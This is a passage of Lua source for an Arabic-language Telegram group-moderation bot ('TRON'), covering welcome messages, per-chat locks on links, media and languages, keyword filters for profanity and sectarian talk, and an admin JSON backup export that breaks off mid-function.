if DevAbd:sismember(TRON..'Abd:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n⌁︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n⌁︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevAbd:get(TRON.."Abd:Text:BotWelcome") then AbdText = DevAbd:get(TRON.."Abd:Text:BotWelcome") else AbdText = "⌁︙مرحبا انا بوت اسمي "..NameBot.."\n⌁︙حالة المجموعه ↫ "..BotText.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉" end 
if DevAbd:get(TRON.."Abd:Photo:BotWelcome") then AbdPhoto = DevAbd:get(TRON.."Abd:Photo:BotWelcome") elseif abbas.photos_[0] then AbdPhoto = abbas.photos_[0].sizes_[1].photo_.persistent_id_ else AbdPhoto = nil end 
if AbdPhoto ~= nil then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,AbdPhoto,AbdText)
else 
send(msg.chat_id_,msg.id_,AbdText)
end 
end   
end
end,nil)
end
if DevAbd:get(TRON..'Abd:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if DevAbd:get(TRON.."Abd:Lock:Welcome"..msg.chat_id_) then
if DevAbd:get(TRON..'Abd:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevAbd:get(TRON..'Abd:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@YYYYAX]'))
Dev_Abd(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
--     Source TRON     --
--        Contact         --
elseif msg.content_.ID == "MessageContact" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbd:get(TRON..'Abd:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source TRON     --
--         Audio          --
elseif msg.content_.ID == "MessageAudio" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbd:get(TRON..'Abd:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source TRON     --
--         Voice          --
elseif msg.content_.ID == "MessageVoice" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbd:get(TRON..'Abd:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source TRON     --
--        Location        --
elseif msg.content_.ID == "MessageLocation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbd:get(TRON..'Abd:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source TRON     --
--         Video          --
elseif msg.content_.ID == "MessageVideo" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbd:get(TRON..'Abd:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source TRON     --
--          Gif           --
elseif msg.content_.ID == "MessageAnimation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbd:get(TRON..'Abd:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source TRON     --
--         Text           --
elseif msg.content_.ID == "MessageText" then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if DevAbd:get(TRON..'Abd:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevAbd:get(TRON..'Abd:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbd:get(TRON..'Abd:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.text_:match("@") then
if DevAbd:get(TRON..'Abd:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("#") then
if DevAbd:get(TRON..'Abd:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbd:get(TRON..'Abd:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevAbd:get(TRON..'Abd:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
if not DevAbd:get(TRON..'Abd:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevAbd:get(TRON..'Abd:Spam:Text'..msg.chat_id_))
end
if DevAbd:get(TRON..'Abd:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevAbd:get(TRON..'Abd:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
--     Source TRON     --
if DevAbd:get(TRON.."Abd:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"⌁︙تم الغاء حفظ الرابط")       
DevAbd:del(TRON.."Abd:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevAbd:set(TRON.."Abd:Groups:Links"..msg.chat_id_,Link)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرابط بنجاح', 1, 'md')
DevAbd:del(TRON.."Abd:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false 
end
end
--     Source TRON     --
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if DevAbd:get('TRONTEAM:'..TRON.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbd:del('TRONTEAM:'..TRON..'id:user'..msg.chat_id_)  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
DevAbd:del('TRONTEAM:'..TRON.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbd:del('TRONTEAM:'..TRON.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbd:get('TRONTEAM:'..TRON..'id:user'..msg.chat_id_)  
DevAbd:incrby(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Abd(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' رساله', 1, 'md')
DevAbd:del('TRONTEAM:'..TRON..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevAbd:get('TRONTEAM:'..TRON.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbd:del('TRONTEAM:'..TRON..'ids:user'..msg.chat_id_)  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
DevAbd:del('TRONTEAM:'..TRON.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbd:del('TRONTEAM:'..TRON.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbd:get('TRONTEAM:'..TRON..'ids:user'..msg.chat_id_)  
DevAbd:incrby(TRON..'Abd:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_Abd(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' نقطه', 1, 'md')
DevAbd:del('TRONTEAM:'..TRON..'ids:user'..msg.chat_id_)  
end
end
--     Source TRON     --
if text and (text:match("طيز") or text:match("ديس") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("كس امك") or text:match("صرم") or text:match("كس اختك")) then
if not DevAbd:get(TRON.."Abd:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع الفشار في المجموعه")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevAbd:get(TRON.."Abd:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevAbd:get(TRON.."Abd:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevAbd:get(TRON.."Abd:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع الكفر في المجموعه") 
end end
if text and (text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("شيعة")) then
if not DevAbd:get(TRON.."Abd:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع التكلم بالطائفيه هنا") 
end end
--     Source TRON     --
if SecondSudo(msg) then
if text == 'جلب نسخه الكروبات' or text == 'جلب نسخه احتياطيه' or text == 'جلب النسخه الاحتياطيه' then
local List = DevAbd:smembers(TRON..'Abd:Groups') 
local BotName = (DevAbd:get(TRON.."Abd:NameBot") or 'ترون')
local GetJson = '{"BotId": '..TRON..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevAbd:get(TRON.."Abd:Groups:Links"..v)
Welcomes = DevAbd:get(TRON..'Abd:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
AbdConstructors = DevAbd:smembers(TRON..'Abd:AbdConstructor:'..v)
Constructors = DevAbd:smembers(TRON..'Abd:BasicConstructor:'..v)
BasicConstructors = DevAbd:smembers(TRON..'Abd:Constructor:'..v)
Managers = DevAbd:smembers(TRON..'Abd:Managers:'..v)
Admis = DevAbd:smembers(TRON..'Abd:Admins:'..v)
Vips = DevAbd:smembers(TRON..'Abd:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #AbdConstructors ~= 0 then
GetJson = GetJson..'"AbdConstructors":['
for k,v in pairs(AbdConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..TRON..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..TRON..'.json', '⌁︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..TRON..'.json')
end
if text and (text == 'رفع النسخه' or text == 'رفع النسخه الاحتياطيه' or text == 'رفع نسخه الاحتياطيه') and tonumber(msg.reply_to_message_id_) > 0 then   
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
--     Source TRON     --
if DevAbd:get(TRON.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Abd( msg.chat_id_, msg.id_, 1,"⌁︙يوجد فقط ( 6 ) اختيارات\n⌁︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
